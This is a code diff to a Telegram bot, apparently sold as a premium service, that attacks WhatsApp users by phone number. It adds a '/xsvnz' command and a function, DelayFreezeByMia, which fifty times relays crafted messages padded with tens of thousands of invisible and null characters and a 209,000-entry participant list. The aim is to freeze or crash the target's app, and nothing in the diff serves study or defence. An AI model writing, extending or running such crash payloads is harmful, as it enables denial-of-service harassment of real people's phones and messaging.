@@ -1456,7 +1456,7 @@ bot.action('/bug_menu', async (ctx) => {
 I N V I S I B L E   B U G S
 ⓘ /xinvis - Delay Hard Extreme
 /xintyx - Delay Hard murbug
-/luminous
+/xsvnz - Freeze Murbug 
 \`\`\``;
 
     const keyboard = [
@@ -1636,6 +1636,51 @@ bot.command("xintyx", checkWhatsAppConnection, checkPremium(), async (ctx) => {
 
   for (let i = 0; i < 50; i++) {
     await harddelay(sock, target);
+    await sleep(2000);
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
+━━━━━━━━━━━━━━━━━━━━━━━
+⌑ Target: ${q}
+⌑ Type: Invisible Delay Extreme
+⌑ Status: Executing....
+━━━━━━━━━━━━━━━━━━━━━━━
+\`\`\``, {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
+      ]]
+    }
+  });
+});
+
+bot.command("xsvnz", checkWhatsAppConnection, checkPremium(), async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /xintyx 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
+    caption: `\`\`\`JS
+━━━━━━━━━━━━━━━━━━━━━━━
+⌑ Target: ${q}
+⌑ Type: Invisible Freeze 
+⌑ Status: Executing....
+━━━━━━━━━━━━━━━━━━━━━━━
+\`\`\``,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 50; i++) {
+    await DelayFreezeByMia(sock, target);
     await sleep(2000);
   }
 
@@ -2038,6 +2083,43 @@ async function harddelay(sock, target) {
   }
   
   console.log("harddelay function completed after 60 seconds for target:", target);
+}
+
+async function DelayFreezeByMia(sock, target) {
+  for (let i = 0; i < 50; i++) {
+    const zephyrineMessages = {
+      groupStatusMessageV2: {
+        message: {
+          albumMessage: {
+            expectedImageCount: 100,
+            collectionId: "Kuzoo Nih Bosh",
+            title: "Kuzoo Nih Bosh" + "\u200e".repeat(50000),
+            contextInfo: {
+              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+              isForwarded: true,
+              forwardingScore: 9999,
+              urlTrackingMap: {
+                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
+                  participant: `62${z + 899099}@s.whatsapp.net`
+                }))
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, zephyrineMessages, {
+      participant: { jid: target }
+    });
+
+    const delay = 1000 + Math.floor(i / 5) * 500;
+    await new Promise(resolve => setTimeout(resolve, delay));
+
+    if ((i + 1) % 10 === 0) {
+      await new Promise(resolve => setTimeout(resolve, 3000));
+    }
+  }
 }
 
 // ------ ( Akhir Of Function Bug) ------ //
